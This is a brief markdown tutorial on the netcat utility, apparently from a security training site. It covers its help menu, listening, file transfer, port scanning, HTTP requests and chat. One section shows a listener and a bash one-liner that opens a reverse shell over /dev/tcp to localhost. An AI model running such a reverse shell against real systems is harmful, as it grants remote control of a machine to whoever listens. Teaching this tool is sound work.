# Netcat
netcat  is  a  simple **unix utility** which *reads* and *writes* data across network connections, using TCP or UDP protocol. It is designed to be a reliable "back-end" tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich `network debugging and exploration tool`, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or "nc" as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.

The simplest usage
```
nc host port
```
### Help Menu
```
└─# netcat -h                                                                                                                                                       1 ⨯
[v1.10-46]
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-r			randomize local and remote ports
	-q secs			quit after EOF on stdin and delay of secs
	-s addr			local source address
	-T tos			set Type Of Service
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-C			Send CRLF as line-ending
	-z			zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```

#### 1. To start listening on a port, first Open 2 terminal windows.

It will not display anything but will start listening to port 1234 at the localhost from terminal 1. And anything entered in terminal 2 will be reflected back in terminal 1 as well which confirms that the connection is established successfully.

Terminal 1 for listening
```
nc -l -p 1234
```
Terminal 2 sending request
```
$nc 127.0.0.1 1234
```
#### 2. To transfer data. Open 2 terminal windows.

It will send the input.txt file’s data from terminal 2 to the output.txt file at terminal 1.

Terminal 1 for listening
```
nc -l -p 1234 >output.txt
```
Terminal 2 for sending request
```
echo "armourinfosec" >input.txt
nc 127.0.0.1 1234 <input.txt
```
#### 3. To perform Port Scanning.

It will display the port number with the status(open or not).

Scanning a single port
```
netcat -z -v 127.0.0.1 1234
```
Scanning multiple ports
```
nc -z -v 127.0.0.1 1234 1235
```
Scanning a range of ports
```
nc -z -v 127.0.0.1 1233-1240
```
#### 4. To send an HTTP Request
```
printf “GET /nc.1 HTTPs/1.1\r\nHost: armourinfosec.com\r\n\r\n” | nc armourinfosec.com 80

```
#### 5. Creating Reverse Shell

- Setup a listener

Replace the port number 5555 with the port you want to receive the connection on.
```
nc –nlvp 5555
```
- Receive connection along with a shell from target
```
bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/5555 <&1'
```
#### 6. To perform simple chat 
command for terminal 1
```
nc -lp 1234
```
command for terminal 2
```
nc 127.0.0.1 1234
```
#### References:
[geeksforgeeks](https://www.geeksforgeeks.org/practical-uses-of-ncnetcat-command-in-linux/)
```
man netcat
```
